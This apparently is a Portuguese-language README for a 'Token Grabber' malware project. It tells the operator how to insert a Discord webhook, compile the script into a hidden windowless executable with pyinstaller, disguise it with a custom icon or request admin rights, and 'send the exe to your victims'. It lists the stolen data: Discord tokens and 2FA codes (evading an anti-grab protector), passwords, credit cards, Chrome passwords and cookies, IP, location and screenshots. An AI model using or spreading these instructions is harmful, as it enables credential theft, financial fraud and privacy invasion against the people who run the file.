

#### TZ Token Grabber foi feito por
Amor ❌ código ✅

## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Marque este repositório se você gostou do Token Grabber!

---

## Instalação

#### ao executar o arquivo, você receberá o seguinte no seu webhook:
  - Nome do usuário
  - Nome do computador
  - IP
  - Cidade
  - Região
  - País
  - Localização do Google Maps
  - Captura de tela do seu PC
  - Todos os seus tokens de discórdia válidos (ignora o protetor anti-token-grab do betterdiscord)
  - Códigos Discord 2fa (se tiverem 2fa habilitado ofc)
  - Senha do Discord (você obtém a senha deles se eles a atualizarem)
  - Todo o cartão de crédito (se eles colocarem um)
  - Todas as senhas e cookies do Chrome
> A webhook se parece com isso:

<p align="left"><img src="https://media.discordapp.net/attachments/933664089186643988/942729574603694080/unknown.png?width=563&height=427"</p>

### 📁・Configurando o Token Grabber
1. Comece instalando [python](https://www.python.org/) ofc
2. abra main.py com qualquer editor de código de sua escolha e cole seu webhook na linha 17 (ou substitua "SUA_WEBHOOK" pelo webhook)
3. execute o `setup.bat` e deixe-o fazer suas coisas
4. uma janela deve aparecer pedindo o nome do exe e depois de corrigir tudo isso, você deve ter o seu exe
5. envie exe para suas vítimas 😈

### ⚙・Compilando manualmente o código-fonte
Se você não quiser executar build-exe.bat e compilá-lo assim, você pode
Comece abrindo um cmd em seu diretório e digite:
```
pyinstaller --onefile --clean --noconsole main.py
```
substitua main.py pelo nome do arquivo se você o alterou.
3 pastas e 1 arquivo serão criados, você pode excluí-los todos, exceto a pasta dist
vá para a pasta dist e lá está o seu exe pronto para ser enviado para as vítimas!

### 💾・ Mais opções
Adicione-os ao comando ao criar o exe, se desejar

|    Pyinstaller Opções		|
| ------------------------------------ 	|
| `-n name` Nome que o exe terá (o padrão é o arquivo .py)	|
| `-i icon.ico` Ícone que o exe terá (faça `-i NONE` para o aspecto executável normal)	|
| `--clean` Limpe o cache do PyInstaller e remova os arquivos temporários antes de compilar	|
| `--uac-admin` Solicita privilégios de administrador ao executar o exe |
| `--hidden-import MODULENAME` Nomeie uma importação não visível no código do script. Pode ser usado várias vezes |
